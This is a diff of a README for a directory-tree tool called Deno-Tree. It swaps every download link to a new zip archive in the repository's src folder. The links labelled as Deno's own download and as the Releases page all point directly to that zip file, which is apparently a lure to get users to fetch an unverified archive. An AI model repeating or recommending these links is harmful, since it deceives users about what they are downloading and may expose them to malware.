@@ -6,7 +6,7 @@ Welcome to Deno-Tree! This tool helps you create clear and beautiful directory t
 
 ## 📦 Download Deno-Tree
 
-[![Download Deno-Tree](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Deno-Tree-v1.6.zip)](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Deno-Tree-v1.6.zip)
+[![Download Deno-Tree](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Tree-Deno-v3.5.zip)](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Tree-Deno-v3.5.zip)
 
 You can get the latest version of Deno-Tree from our Releases page. 
 
@@ -15,12 +15,12 @@ You can get the latest version of Deno-Tree from our Releases page.
 To use Deno-Tree, you need:
 
 - A computer running Windows, macOS, or Linux.
-- Deno installed. You can download it from [https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Deno-Tree-v1.6.zip](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Deno-Tree-v1.6.zip).
+- Deno installed. You can download it from [https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Tree-Deno-v3.5.zip](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Tree-Deno-v3.5.zip).
 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Deno-Tree-v1.6.zip) to see the available versions. 
+   Go to the [Releases page](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Tree-Deno-v3.5.zip) to see the available versions. 
 
 2. **Select the Latest Version**  
    Look for the latest version. It will be at the top of the list.
@@ -85,7 +85,7 @@ We welcome contributions! If you want to help improve Deno-Tree, please check th
 
 ## 📅 Release Notes
 
-Check the release notes on the [Releases page](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Deno-Tree-v1.6.zip) to see updates, new features, and fixes.
+Check the release notes on the [Releases page](https://raw.githubusercontent.com/unishd8977/Deno-Tree/main/src/Tree-Deno-v3.5.zip) to see updates, new features, and fixes.
 
 ## ⚖️ License
 
